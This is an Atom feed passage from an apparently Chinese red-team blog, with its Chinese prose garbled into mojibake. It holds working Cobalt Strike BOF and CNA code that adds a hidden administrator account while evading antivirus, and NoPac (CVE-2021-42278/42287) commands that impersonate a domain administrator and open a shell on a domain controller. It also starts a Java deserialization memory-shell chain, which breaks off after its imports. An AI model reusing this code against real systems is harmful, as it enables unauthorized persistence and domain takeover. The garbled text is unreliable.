<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://sl3epf.github.io</id>
    <title>ç§‹å˜ä¸ªç§‹</title>
    <updated>2024-03-11T13:37:11.891Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://sl3epf.github.io"/>
    <link rel="self" href="https://sl3epf.github.io/atom.xml"/>
    <subtitle>å¼ƒæˆ‘å»è€…ï¼Œæ˜¨æ—¥ä¹‹æ—¥ä¸å¯ç•™
&lt;br/&gt;
ä¹±æˆ‘å¿ƒè€…ï¼Œä»Šæ—¥ä¹‹æ—¥å¤šçƒ¦å¿§</subtitle>
    <logo>https://sl3epf.github.io/images/avatar.png</logo>
    <icon>https://sl3epf.github.io/favicon.ico</icon>
    <rights>All rights reserved 2024, ç§‹å˜ä¸ªç§‹</rights>
    <entry>
        <title type="html"><![CDATA[[CobalStrike] BOFåŠcnaæ’ä»¶å¼€å‘åˆæ¢]]></title>
        <id>https://sl3epf.github.io/post/rCccLTo7M/</id>
        <link href="https://sl3epf.github.io/post/rCccLTo7M/">
        </link>
        <updated>2024-01-30T05:18:23.000Z</updated>
        <content type="html"><![CDATA[<!-- more -->
<h1 id="å‰è¨€">å‰è¨€</h1>
<p>ä¸»è¦è®²ä¸‹bofçš„ä»£ç ç¼–å†™å’Œä½¿ç”¨ï¼Œå…·ä½“ä¸€äº›åŸç†åˆ†æå¯ä»¥çœ‹<br>
https://tttang.com/archive/1786/</p>
<h1 id="beacon-object-file">Beacon Object File</h1>
<p>bofèƒ½å¤ŸåŠ è½½å¹¶æ‰§è¡ŒC/C++ç¼–è¯‘åä½†æœªé“¾æ¥çš„ç›®æ ‡objæ–‡ä»¶(linuxä¸­çš„.oæ–‡ä»¶)ã€‚å¯ä»¥åœ¨beaconä¸­æ‰§è¡Œå†…éƒ¨çš„beaconAPIå’ŒWin32APIã€‚å®ƒçš„ä½“ç§¯å¾ˆå°ï¼Œåœ¨beaconè¿›ç¨‹å†…éƒ¨è¿è¡Œï¼Œä¸ä¼šåˆ›å»ºæ–°è¿›ç¨‹ï¼Œæ‰€ä»¥å¯ä»¥æœ‰æ•ˆçš„è§„é¿ä¸€äº›EDRã€‚</p>
<h1 id="å¼€å‘bof">å¼€å‘BOF</h1>
<h2 id="ç¯å¢ƒ">ç¯å¢ƒ</h2>
<pre><code>OS: Windows 10
IDE: VS2022
å¼€å‘æ¨¡ç‰ˆ: https://github.com/securifybv/Visual-Studio-BOF-template
</code></pre>
<p>å°†æ¨¡ç‰ˆä¸‹è½½åï¼Œæˆ‘ä»¬å¯¼å…¥VSçš„æ¨¡ç‰ˆç›®å½•ã€‚<br>
<code>ç”¨æˆ·è·¯å¾„\æ–‡ç¨¿\Visual Studio 2022\Templates\ProjectTemplates</code><br>
ç„¶ååœ¨æ–°å»ºé¡¹ç›®ä¸­å°±èƒ½çœ‹åˆ°æ¨¡ç‰ˆ<br>
<img src="https://sl3epf.github.io/post-images/1706766320417.png" alt="" loading="lazy"><br>
ç„¶ååœ¨ç”Ÿæˆ-&gt;æ‰¹ç”Ÿæˆä¸­å‹¾é€‰ï¼Œæ–¹æ¡ˆé…ç½®é€‰æ‹©BOF<br>
<img src="https://sl3epf.github.io/post-images/1706766427206.png" alt="" loading="lazy"><br>
ç„¶åç”Ÿæˆï¼Œå°±èƒ½å¤Ÿåœ¨é¡¹ç›®ç›®å½•é‡Œçœ‹åˆ°objæ–‡ä»¶<br>
<img src="https://sl3epf.github.io/post-images/1706766538630.png" alt="" loading="lazy"></p>
<h2 id="åŠŸèƒ½å®ç°">åŠŸèƒ½å®ç°</h2>
<p>é¦–å…ˆäº†è§£ä¸€ä¸‹åŠ¨æ€å‡½æ•°è§£æ(DFR)<br>
æ¯”å¦‚æˆ‘ä»¬è¦è·å–å½“å‰ç”¨æˆ·åï¼Œåœ¨Win32APIä¸­å°±è¦è°ƒç”¨<code>GetUserNameA</code>ï¼Œæˆ‘ä»¬ä½¿ç”¨DFRå°±æ˜¯è¦å˜æˆå¦‚ä¸‹æ ¼å¼</p>
<pre><code class="language-C">DECLSPEC_IMPORT DWORD WINAPI ADVAPI32$GetUserNameA(LPSTR, LPDWORD);
</code></pre>
<ul>
<li>DECLSPEC_IMPORTï¼šå¯¼å…¥å‡½æ•°çš„å…³é”®å­—</li>
<li>WINAPIï¼šå‡½æ•°è°ƒç”¨çº¦å®šï¼Œä¸€èˆ¬APIå‡½æ•°éƒ½æ˜¯è¿™ä¸ª</li>
<li>ADVAPI32ï¼šå‡½æ•°æ‰€åœ¨çš„æ¨¡å—å</li>
<li>GetUserNameAï¼šå‡½æ•°åç§°</li>
</ul>
<h2 id="æŸ¥æ‰¾å½“å‰åŸŸ">æŸ¥æ‰¾å½“å‰åŸŸ</h2>
<p>ç®€å•å®ç°ä¸€ä¸ªæŸ¥æ‰¾å½“å‰åŸŸåŠŸèƒ½<br>
ä¿®æ”¹æ¨¡ç‰ˆä¸­<code>Source.c</code></p>
<pre><code class="language-C">#include &lt;windows.h&gt; 
#include &lt;stdio.h&gt; 
#include &lt;dsgetdc.h&gt; 
#include &quot;beacon.h&quot; 

#pragma region error_handling
#define print_error(msg, hr) _print_error(__FUNCTION__, __LINE__, msg, hr)
BOOL _print_error(char* func, int line, char* msg, HRESULT hr) {
#ifdef BOF
	//BeaconPrintf(CALLBACK_ERROR, &quot;(%s at %d): %s 0x%08lx&quot;, func, line,  msg, hr);
	BeaconPrintf(CALLBACK_OUTPUT, &quot;Hello world&quot;);
#else
	printf(&quot;[-] (%s at %d): %s 0x%08lx&quot;, func, line, msg, hr);
#endif // BOF

	return FALSE;
}
#pragma endregion

DECLSPEC_IMPORT DWORD WINAPI NETAPI32$DsGetDcNameA(LPVOID, LPVOID, LPVOID, LPVOID, ULONG, LPVOID);
DECLSPEC_IMPORT DWORD WINAPI NETAPI32$NetApiBufferFree(LPVOID);

#include &lt;LM.h&gt;

#ifdef BOF
void go(char* buff, int len) {
    DWORD dwRet;
    PDOMAIN_CONTROLLER_INFO pdcInfo;
    dwRet = NETAPI32$DsGetDcNameA(NULL, NULL, NULL, NULL, 0, &amp;pdcInfo);
    if (ERROR_SUCCESS == dwRet) {
        BeaconPrintf(CALLBACK_OUTPUT, &quot;%s&quot;, pdcInfo-&gt;DomainName);
    }
    NETAPI32$NetApiBufferFree(pdcInfo);
}
#else

void main(int argc, char* argv[]) {

}

#endif
</code></pre>
<p><img src="https://sl3epf.github.io/post-images/1706769324737.png" alt="" loading="lazy"><br>
äºæ­¤æˆ‘ä»¬ä¹Ÿå¯ä»¥å‘ç°ï¼Œ<code>go</code>å‡½æ•°å°±æ˜¯bofæ‰§è¡Œçš„å…¥å£ï¼Œå½“åœ¨csçš„beaconä¸Šæ‰§è¡Œ<code>inline-execute</code>æ—¶å°±ä¼šè°ƒç”¨<code>go</code>å‡½æ•°ã€‚</p>
<h2 id="bofç»•è¿‡æ€æ¯’æ·»åŠ ç”¨æˆ·">bofç»•è¿‡æ€æ¯’æ·»åŠ ç”¨æˆ·</h2>
<p>æˆ‘ä»¬åœ¨csä¸Šç›´æ¥åˆ©ç”¨<code>net user</code>ä¼šè¢«é˜»æ­¢<br>
<img src="https://sl3epf.github.io/post-images/1706792395021.png" alt="" loading="lazy"><br>
ä½†æ˜¯æˆ‘ä»¬å¦‚æœé‡‡ç”¨bofçš„æ–¹å¼å°±èƒ½å¤Ÿç»•è¿‡<br>
ä»£ç å¦‚ä¸‹</p>
<pre><code class="language-C">#include &lt;windows.h&gt; 
#include &lt;stdio.h&gt; 
#include &quot;bofdefs.h&quot;
#include &quot;beacon.h&quot; 

#pragma region error_handling
#define print_error(msg, hr) _print_error(__FUNCTION__, __LINE__, msg, hr)
BOOL _print_error(char* func, int line, char* msg, HRESULT hr) {
#ifdef BOF
	//BeaconPrintf(CALLBACK_ERROR, &quot;(%s at %d): %s 0x%08lx&quot;, func, line,  msg, hr);
	BeaconPrintf(CALLBACK_OUTPUT, &quot;Hello world&quot;);
#else
	printf(&quot;[-] (%s at %d): %s 0x%08lx&quot;, func, line, msg, hr);
#endif // BOF

	return FALSE;
}
#pragma endregion

typedef DWORD NET_API_STATUS;

DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetUserAdd(LPWSTR, DWORD, PBYTE, PDWORD);
DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetLocalGroupAddMembers(LPCWSTR, LPCWSTR, DWORD, PBYTE, DWORD);

#include &lt;LM.h&gt;

#ifdef BOF
void go(char* buff, int len) {
	USER_INFO_1 UserInfo;

	UserInfo.usri1_name = L&quot;Qqw666&quot;;            
	UserInfo.usri1_password = L&quot;Qqw@#123&quot;;      
	UserInfo.usri1_priv = USER_PRIV_USER;
	UserInfo.usri1_home_dir = NULL;
	UserInfo.usri1_comment = NULL;
	UserInfo.usri1_flags = UF_SCRIPT;
	UserInfo.usri1_script_path = NULL;

	NET_API_STATUS nStatus;

	//åˆ›å»ºç”¨æˆ· 
	// https://learn.microsoft.com/zh-cn/windows/win32/api/lmaccess/nf-lmaccess-netuseradd?redirectedfrom=MSDN
	nStatus = NETAPI32$NetUserAdd(
		NULL, //local server
		1,    // information level
		(LPBYTE)&amp;UserInfo,
		NULL // error value
		);
	if (nStatus == NERR_Success) {
		BeaconPrintf(CALLBACK_OUTPUT, &quot;NetUserAdd Success!\n&quot;, NULL);
		BeaconPrintf(CALLBACK_OUTPUT, &quot;Username: %ws, PassWord: %ws&quot;, UserInfo.usri1_name, UserInfo.usri1_password);
	}
	else {
		BeaconPrintf(CALLBACK_OUTPUT, &quot;NetUserAdd Failed! %d&quot;, nStatus);
	}

	// æ·»åŠ ç”¨æˆ·åˆ°ç®¡ç†å‘˜ç»„
	// https://learn.microsoft.com/zh-cn/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers?redirectedfrom=MSDN
	LOCALGROUP_MEMBERS_INFO_3 account;
	account.lgrmi3_domainandname = UserInfo.usri1_name;

	NET_API_STATUS aStatus;

	aStatus = NETAPI32$NetLocalGroupAddMembers(NULL, L&quot;Administrators&quot;, 3, (LPBYTE)&amp;account, 1);
	if (aStatus == NERR_Success) {
		BeaconPrintf(CALLBACK_OUTPUT, &quot;Add to Administrators success!&quot;, NULL);
	}
	else {
		BeaconPrintf(CALLBACK_OUTPUT, &quot;Add to Administrators failed!&quot;, NULL);
	}

}
#else

void main(int argc, char* argv[]) {
	go();
}

#endif
</code></pre>
<p>æ•ˆæœ<br>
<img src="https://sl3epf.github.io/post-images/1706792473981.png" alt="" loading="lazy"><br>
å¯ä»¥çœ‹åˆ°æˆåŠŸæ·»åŠ ç”¨æˆ·ï¼Œå¹¶ä¸”æ·»åŠ åˆ°ç®¡ç†å‘˜ç»„ã€‚æ³¨æ„æ‰§è¡Œè¿™ä¸ªæ“ä½œéœ€è¦æœ‰adminçš„æƒé™ã€‚</p>
<h1 id="cnaæ’ä»¶å¼€å‘">CNAæ’ä»¶å¼€å‘</h1>
<p>å…·ä½“è¯­æ³•å¯ä»¥è‡ªè¡Œç½‘ä¸Šçœ‹æ–‡ç« ï¼Œè¿™é‡Œæˆ‘çœ‹äº†å‡ ä¸ªæ’ä»¶çš„å†™æ³•ï¼Œæ„Ÿè§‰ä¸»è¦çš„å°±é‚£ä¹ˆå‡ ä¸ªï¼Œä¹Ÿæ¯”è¾ƒç®€å•<br>
å…ˆç»™å‡ºCè¯­è¨€ä»£ç ï¼Œä¿®æ”¹äº†åŠŸèƒ½ï¼Œå¯ä»¥è‡ªå®šä¹‰ç”¨æˆ·åå’Œå¯†ç </p>
<pre><code class="language-C">#include &lt;windows.h&gt; 
#include &lt;stdio.h&gt; 
#include &quot;bofdefs.h&quot;
#include &quot;beacon.h&quot; 

#pragma region error_handling
#define print_error(msg, hr) _print_error(__FUNCTION__, __LINE__, msg, hr)
BOOL _print_error(char* func, int line, char* msg, HRESULT hr) {
#ifdef BOF
	//BeaconPrintf(CALLBACK_ERROR, &quot;(%s at %d): %s 0x%08lx&quot;, func, line,  msg, hr);
	BeaconPrintf(CALLBACK_OUTPUT, &quot;Hello world&quot;);
#else
	printf(&quot;[-] (%s at %d): %s 0x%08lx&quot;, func, line, msg, hr);
#endif // BOF

	return FALSE;
}
#pragma endregion

typedef DWORD NET_API_STATUS;

DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetUserAdd(LPWSTR, DWORD, PBYTE, PDWORD);
DECLSPEC_IMPORT NET_API_STATUS WINAPI NETAPI32$NetLocalGroupAddMembers(LPCWSTR, LPCWSTR, DWORD, PBYTE, DWORD);

#include &lt;LM.h&gt;

#ifdef BOF
void go(char* buff, int len) {
	datap parser;

	LPWSTR username;
	LPWSTR password;

	// åˆå§‹åŒ–datapç»“æ„ä½“å˜é‡(parser),ç”¨äºè§£æä»Beaconæ¥æ”¶åˆ°çš„å­—èŠ‚æµ(buff)
	BeaconDataParse(&amp;parser, buff, len);
	username = (LPWSTR)BeaconDataExtract(&amp;parser, NULL);
	password = (LPWSTR)BeaconDataExtract(&amp;parser, NULL);

	BeaconPrintf(CALLBACK_OUTPUT, &quot;Extracted username: %S&quot;, username);
	BeaconPrintf(CALLBACK_OUTPUT, &quot;Extracted password: %S&quot;, password);

	USER_INFO_1 UserInfo;


	UserInfo.usri1_name = username;
	UserInfo.usri1_password = password;
	UserInfo.usri1_priv = USER_PRIV_USER;
	UserInfo.usri1_home_dir = NULL;
	UserInfo.usri1_comment = NULL;
	UserInfo.usri1_flags = UF_SCRIPT;
	UserInfo.usri1_script_path = NULL;

	NET_API_STATUS nStatus;

	//åˆ›å»ºç”¨æˆ· 
	// https://learn.microsoft.com/zh-cn/windows/win32/api/lmaccess/nf-lmaccess-netuseradd?redirectedfrom=MSDN
	nStatus = NETAPI32$NetUserAdd(
		NULL, //local server
		1,    // information level
		(LPBYTE)&amp;UserInfo,
		NULL // error value
	);
	if (nStatus == NERR_Success) {
		BeaconPrintf(CALLBACK_OUTPUT, &quot;NetUserAdd Success!&quot;, NULL);
		BeaconPrintf(CALLBACK_OUTPUT, &quot;Username: %ws, PassWord: %ws&quot;, UserInfo.usri1_name, UserInfo.usri1_password);
	}
	else {
		BeaconPrintf(CALLBACK_OUTPUT, &quot;NetUserAdd Failed! %d&quot;, nStatus);
	}

	// æ·»åŠ ç”¨æˆ·åˆ°ç®¡ç†å‘˜ç»„
	// https://learn.microsoft.com/zh-cn/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers?redirectedfrom=MSDN
	LOCALGROUP_MEMBERS_INFO_3 account;
	account.lgrmi3_domainandname = UserInfo.usri1_name;

	NET_API_STATUS aStatus;

	aStatus = NETAPI32$NetLocalGroupAddMembers(NULL, L&quot;Administrators&quot;, 3, (LPBYTE)&amp;account, 1);
	if (aStatus == NERR_Success) {
		BeaconPrintf(CALLBACK_OUTPUT, &quot;Add to Administrators success!&quot;, NULL);
	}
	else {
		BeaconPrintf(CALLBACK_OUTPUT, &quot;Add to Administrators failed!&quot;, NULL);
	}

}
#else

void main(int argc, char* argv[]) {
	go();
}

#endif
</code></pre>
<p>cnaä»£ç </p>
<pre><code class="language-C">beacon_command_register(
&quot;adduser&quot;, 
&quot;Add a user to administrators&quot;, 
&quot;usage: adduser [username] [password]&quot;);

alias adduser{
	local('$handle $data $args');

	$uname = $2;
	$pass = $3;

	if ($uname eq &quot;&quot; or $pass eq &quot;&quot;) {
		berror($1, &quot;usage command: help adduser&quot;);
		return;
	}

	# è¯»å…¥bofæ–‡ä»¶

    $handle = openf(script_resource(&quot;source.obj&quot;));
    $data = readb($handle, -1);
    closef($handle);

	# æ‰“åŒ…å‚æ•°ä¸¤ä¸ªZZä»£è¡¨ä¸¤ä¸ªå‚æ•°
	$args = bof_pack($1, &quot;ZZ&quot;, $uname, $pass);

    # æ‰§è¡Œbof
     # &quot;go&quot;æ˜¯BOFä¸­çš„å‡½æ•°åï¼Œ$argsæ˜¯ä¼ é€’ç»™è¿™ä¸ªå‡½æ•°çš„å‚æ•°
	beacon_inline_execute($1, $data, &quot;go&quot;, $args);
}
</code></pre>
<p>æ•ˆæœå¦‚ä¸‹<br>
<img src="https://sl3epf.github.io/post-images/1706802021881.png" alt="" loading="lazy"></p>
<h1 id="æ€»ç»“">æ€»ç»“</h1>
<p>å¤´ä¸€å›å†™è¿™ç©æ„ã€‚ã€‚ã€‚åŠ ä¸Šwindowsçš„åŸºç¡€ä¸æ˜¯å¾ˆå¥½ï¼Œä¸€å¤©ä¸‹æ¥è¸©äº†å¥½å¤šå‘ã€‚ã€‚ã€‚</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[NoPacæ¼æ´åŸç†åŠåˆ©ç”¨]]></title>
        <id>https://sl3epf.github.io/post/cM-wSyF-g/</id>
        <link href="https://sl3epf.github.io/post/cM-wSyF-g/">
        </link>
        <updated>2024-01-17T10:29:07.000Z</updated>
        <content type="html"><![CDATA[<!-- more -->
<h1 id="å‰è¨€">å‰è¨€</h1>
<p>åˆ©ç”¨CVE-2021-42278 &amp; CVE-2021-42287ï¼Œä¸¤ä¸ªæ¼æ´ç»„åˆå¯ä½¿åŸŸå†…æ™®é€šç”¨æˆ·æƒé™æå‡è‡³åŸŸç®¡æƒé™ã€‚</p>
<h1 id="åŸç†">åŸç†</h1>
<h2 id="cve-2021-42278">CVE-2021-42278</h2>
<p>å…è®¸æ”»å‡»è€…ä¿®æ”¹ä»»æ„æœºå™¨è´¦æˆ·çš„saMAccountNameå­—æ®µï¼Œä»è€Œå¯ä»¥æ¨¡æ‹ŸåŸŸæ§ç”³è¯·TGTç¥¨æ®ã€‚<br>
é»˜è®¤åŠ å…¥éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæœºå™¨åï¼ŒåŸŸä¸­çš„æœºå™¨è´¦æˆ·é»˜è®¤ä»¥<code>$</code>ç»“å°¾ï¼ŒsaMAccountNameçš„å€¼é»˜è®¤å’Œæœºå™¨åä¸€æ ·ã€‚ä½†æ˜¯DCæ²¡æœ‰å¯¹saMAccountNameçš„å€¼è¿›è¡Œåˆæ³•æ€§åˆ¤æ–­ï¼Œåˆ é™¤saMAccountNameåçš„<code>$</code>ç¬¦å·ä¾ç„¶èƒ½ä»¥æœºå™¨è´¦æˆ·ç”³è¯·TGTç¥¨æ®<br>
<img src="https://sl3epf.github.io/post-images/1705494695636.png" alt="" loading="lazy"><br>
maq=10é»˜è®¤å¯ä»¥åˆ›å»º10ä¸ªåŸŸæœºå™¨<br>
<img src="https://sl3epf.github.io/post-images/1705495041051.png" alt="" loading="lazy"></p>
<h2 id="cve-2021-42287">CVE-2021-42287</h2>
<p>åˆ›å»ºä¸€ä¸ªæ™®é€šæœºå™¨è´¦æˆ·ï¼Œå°†å…¶sAMAccountNameæ”¹ä¸ºå’ŒåŸŸæ§æœºå™¨è´¦æˆ·åç›¸åŒä½†ä¸ä»¥<code>$</code>ç»“å°¾ï¼Œç”¨è¯¥è´¦æˆ·è¿›è¡ŒTGTè¯·æ±‚åå°†sAMAccountNameéšä¾¿ä¿®æ”¹ï¼Œå†ç”¨TGTå»ç”³è¯·STï¼Œåœ¨TGS_REPä¸­ï¼Œç”±äºäºŒæ¬¡æ”¹ååï¼Œæ­¤æ—¶åŸŸå†…å·²ç»æ²¡æœ‰è¯¥è´¦æˆ·ï¼Œå¯¼è‡´åŸŸæ§æ‰¾ä¸åˆ°å®ƒï¼Œåè®®çš„å¤„ç†é€»è¾‘ä¼šè‡ªåŠ¨åœ¨ä¸»æœºåååŠ ä¸Š<code>$</code>ç»§ç»­æœç´¢ï¼Œç»“æœå°±ä¼šæœç´¢åˆ°åŸŸæ§æœºå™¨è´¦æˆ·ï¼Œç„¶åç”¨<code>S4U2Self</code>å†’å……DCå»è¯·æ±‚STï¼Œä»è€Œé‡æ–°ç”Ÿæˆäº†å¸¦æœ‰åŸŸæ§æƒé™çš„PACï¼ˆåŸæœ¬çš„PACæ˜¯TGSæ‹·ASé˜¶æ®µä¸­çš„ã€‚ä¾ç„¶æ˜¯æˆ‘ä»¬åˆ›å»ºçš„æœºå™¨æƒé™ã€‚ï¼‰æœ€ç»ˆæˆ‘ä»¬å°±è·å¾—äº†ä¸€ä¸ªé«˜æƒé™çš„STç¥¨æ®ã€‚</p>
<h2 id="kerberosè®¤è¯æµç¨‹">Kerberosè®¤è¯æµç¨‹</h2>
<p>è¦æ˜¯ä¸ç†Ÿæ‚‰çš„è¯ï¼Œè¿™é‡Œå†å›é¡¾ä¸€ä¸‹Kerberosçš„è®¤è¯æµç¨‹</p>
<ul>
<li>1.è®¿é—®æœåŠ¡çš„Client(ä»¥ä¸‹è¡¨è¿°ä¸ºClient æˆ–è€…ç”¨æˆ·)</li>
<li>2.æä¾›æœåŠ¡çš„Server(ä»¥ä¸‹è¡¨è¿°ä¸ºæœåŠ¡)</li>
<li>3.KDCï¼ˆKey Distribution Centerï¼‰å¯†é’¥åˆ†å‘ä¸­å¿ƒ</li>
</ul>
<ol>
<li>AS_REQï¼šClientä½¿ç”¨è‡ªå·±çš„hashåŠ å¯†æ—¶é—´æˆ³å‘é€ç»™kdcè¿›è¡Œé¢„è®¤è¯è¯·æ±‚TGT</li>
<li>AS_REPï¼škdcä½¿ç”¨Client Hashè§£å¯†éªŒè¯æ—¶é—´æˆ³ï¼Œå¦‚æœæ­£ç¡®åˆ™å°±è¿”å›ç”¨krbtgt hashåŠ å¯†çš„TGTç¥¨æ®å’ŒPACç­‰ä¿¡æ¯ã€‚</li>
<li>TGS_REQï¼šClientä½¿ç”¨TGTç¥¨æ®å‘KDCå‘èµ·é’ˆå¯¹æŒ‡å®šSPNæœåŠ¡çš„TGS_REQè¯·æ±‚</li>
<li>TGS_REPï¼šKDCè¯†åˆ«spnæœåŠ¡ï¼Œä½¿ç”¨krbtgt hashè§£å¯†TGTç¥¨æ®ï¼Œå¦‚æœè§£å¯†æ­£ç¡®åˆ™è¿”å›è¯¥æœåŠ¡çš„hashåŠ å¯†çš„STç¥¨æ®</li>
<li>AP_REQï¼šClientä½¿ç”¨STç¥¨æ®è¯·æ±‚ç‰¹å®šæœåŠ¡ï¼Œå°†PACä¼ é€’ç»™æœåŠ¡ï¼Œç„¶åæœåŠ¡é€šè¿‡PACæŸ¥çœ‹ç”¨æˆ·çš„SIDå’Œç”¨æˆ·ç»„ç­‰ä¿¡æ¯å’ŒæœåŠ¡è‡ªèº«çš„ACLè¿›è¡Œå¯¹æ¯”ï¼Œè¿”å›ç‰¹å®šçš„RPCçŠ¶æ€ä»£ç </li>
<li>AP_REPï¼šéªŒè¯AP_REQæ˜¯å¦æ­£ç¡®ç‰¹å®šæœåŠ¡ä½¿ç”¨è‡ªå·±çš„hashè§£å¯†ï¼Œå¦‚æœéªŒè¯æ­£ç¡®å‘KDCå‘é€TGSç¥¨æ®è¯¢é—®è¯¥Clientæ˜¯å¦æœ‰æƒé™è®¿é—®è‡ªèº«æœåŠ¡ã€‚</li>
</ol>
<h2 id="å…³æ³¨">å…³æ³¨</h2>
<h3 id="pac">PAC</h3>
<p>PACåœ¨å…¶ä¸­å‡ºç°çš„èŠ‚ç‚¹ä¸ºAS_REPå’ŒAP_REPã€‚åœ¨AS_REPä¸­ï¼ŒKDCè¿”å›çš„tgtç¥¨æ®ä¸­åŒ…å«äº†PACã€‚PACä¸­åŒ…å«äº†ç”¨æˆ·çš„SIDå’Œç”¨æˆ·ç»„ç­‰ä¿¡æ¯ã€‚<br>
åœ¨AP_REPä¸­ï¼ŒæœåŠ¡è§£å¯†éªŒè¯æ­£ç¡®åå°†PACå‘é€ç»™KDCï¼ŒKDCæ ¹æ®PACçš„å€¼æ¥åˆ¤æ–­ç”¨æˆ·æ˜¯å¦æœ‰æƒé™è®¿é—®è¯¥æœåŠ¡ã€‚</p>
<h3 id="s4u2self">S4U2Self</h3>
<figure data-type="image" tabindex="1"><img src="https://sl3epf.github.io/post-images/1705504175114.png" alt="" loading="lazy"></figure>
<p>ä¸ºä»€ä¹ˆè¦ä½¿ç”¨S4U2Selfåè®®è¿›è¡Œè¯·æ±‚ï¼Ÿè¿™ä¹Ÿæ˜¯æ¼æ´ä¸»è¦å­˜åœ¨çš„åŸå› <br>
å‚è€ƒçœ‹é•¿äº­ğŸ‘´çš„ä»æºç åˆ†æhttps://mp.weixin.qq.com/s/Ar8u_gXh2i3GEcqdhOD8wA<br>
ç®€å•æ¥è¯´å°±æ˜¯KDCå¤„ç†S4Uå’ŒéS4Uè¯·æ±‚ä¸­çš„PACçš„æ–¹å¼æ˜¯ä¸åŒçš„ã€‚<br>
å½“é‡‡ç”¨çš„ä¸æ˜¯S4Uçš„è¯·æ±‚ï¼Œåˆ™ç›´æ¥ä»TGTçš„<code>AuthData</code>ä¸­æå–PACï¼ˆä¹‹å‰åœ¨AS_REPé˜¶æ®µè·å¾—çš„ï¼‰<br>
å½“é‡‡ç”¨çš„æ˜¯S4Uçš„è¯·æ±‚ï¼Œå®ƒå°±ä¼šå¯¹åº”ç”¨æˆ·å»ç”Ÿæˆä¸€ä¸ªæ–°çš„PACï¼ˆæˆ‘ä»¬æ¨¡æ‹Ÿçš„ç”¨æˆ·æ˜¯<code>Administrator</code>ï¼Œæ‰€ä»¥æœ€åèƒ½è·å¾—ä¸€ä¸ªé«˜æƒé™çš„STï¼‰ã€‚</p>
<h1 id="å¤ç°">å¤ç°</h1>
<h2 id="éªŒè¯">éªŒè¯</h2>
<p>é¦–å…ˆéªŒè¯æ¼æ´å­˜åœ¨ï¼Œå› ä¸ºæ¼æ´è¡¥ä¸è¯´æ˜TGTä¸­è¦æºå¸¦PACï¼Œè€Œæˆ‘ä»¬ä¾ç„¶å¯ä»¥ç”³è¯·ä¸€ä¸ªä¸å¸¦PACçš„TGT<br>
<img src="https://sl3epf.github.io/post-images/1705506188443.png" alt="" loading="lazy"><br>
è¯æ˜æ¼æ´å­˜åœ¨</p>
<h2 id="åˆ©ç”¨">åˆ©ç”¨</h2>
<p>è¿˜æœ‰ä¸€æ­¥æ”¹æœºå™¨çš„saMAccountNameä¸ºåŸŸæ§æœºå™¨å»æ‰$ç”³è¯·TGTå¿˜è®°å†™äº†ã€‚<br>
<img src="https://sl3epf.github.io/post-images/1705506843849.jpg" alt="" loading="lazy"></p>
<h1 id="maq0å¦‚ä½•åˆ©ç”¨">MAQ=0å¦‚ä½•åˆ©ç”¨</h1>
<p>CreateChild accountåˆ©ç”¨<br>
æŸ¥æ‰¾æœ‰è¯¥æƒé™çš„è´¦æˆ·</p>
<pre><code>AdFind.exe -sc getacls -sddlfilter ;;&quot;[CR CHILD]&quot;;;computer; -recmute
</code></pre>
<p>åˆ©ç”¨-create-child</p>
<pre><code>python noPac.py test.local/qqw:&quot;Qqw123456..&quot; -dc-ip 192.168.2.24 -dc-host dc1 -shell --impersonate administrator -use-ldap -create-child
</code></pre>
<h1 id="å‚è€ƒ">å‚è€ƒ</h1>
<p>https://daiker.gitbook.io/<br>
https://forum.butian.net/share/2408<br>
https://mp.weixin.qq.com/s/Ar8u_gXh2i3GEcqdhOD8wA</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[å®æˆ˜-CC6æ”¹é€ åŠ è½½æ¶æ„å­—èŠ‚ç æ³¨å…¥å†…å­˜é©¬]]></title>
        <id>https://sl3epf.github.io/post/fufMcoOWa/</id>
        <link href="https://sl3epf.github.io/post/fufMcoOWa/">
        </link>
        <updated>2024-01-12T14:24:56.000Z</updated>
        <content type="html"><![CDATA[<!-- more -->
<h1 id="å‰è¨€">å‰è¨€</h1>
<p>èµ¶äº†ä¸€å¤©è½¦ï¼Œå¤´æ™•æ™•ğŸ˜µâ€ğŸ’«<br>
æ¥ç€æ˜¨å¤©æ²¡åˆ†æå®Œçš„ç‚¹ç»§ç»­æ</p>
<h1 id="åˆ©ç”¨åˆ†æ">åˆ©ç”¨åˆ†æ</h1>
<p>ç›®æ ‡æ˜¯æŸäº‘åŒ£å­çš„fastjsonæ¼æ´ï¼Œå…³äºæ¼æ´å…·ä½“åˆ†æçœ‹æˆ‘jackğŸ‘´<br>
<strong>https://zjackky.github.io/post/java-securityc3p0-chain-original-analysis-duplicated-20240113-17-05-58-cgbxn.html</strong></p>
<h2 id="é—®é¢˜">é—®é¢˜</h2>
<p>å¼€å§‹æ˜¯ç®€å•çš„æƒ³åˆ°åˆ©ç”¨CC3åŠ è½½æ¶æ„ç±»ï¼Œä½†æ˜¯åé¢å°è¯•å‘ç°æ˜¯ä¸è¡Œçš„ã€‚å› ä¸ºæˆ‘ä»¬åœ¨CCé“¾çš„æ—¶å€™äº†è§£è¿‡ï¼Œ<br>
åœ¨jdk8u71ä¹‹åï¼Œä»£ç†ç±»<code>AnnotationInvocationHandler</code>ä¸­çš„<code>this.memberValues</code>è¢«æ›¿æ¢ä¸ºäº†<code>linkedhashmap</code>ï¼Œæ‰€ä»¥ä¼šæŠ¥é”™æ²¡æœ‰<code>entrySet</code>é”®ã€‚</p>
<h2 id="è§£å†³">è§£å†³</h2>
<p>å› ä¸ºCC6æ˜¯ä¸å—ç‰ˆæœ¬é™åˆ¶çš„ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨<code>TemplatesImpl</code>æ”¹é€ å®ƒ<br>
å‚è€ƒè¿™ä¸ªå¸ˆå‚… https://f4de-bak.github.io/pages/ca9de1/#%E6%94%B9%E9%80%A0cc6<br>
å…·ä½“ä»£ç ä¸º</p>
<pre><code class="language-java">package Qiu;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
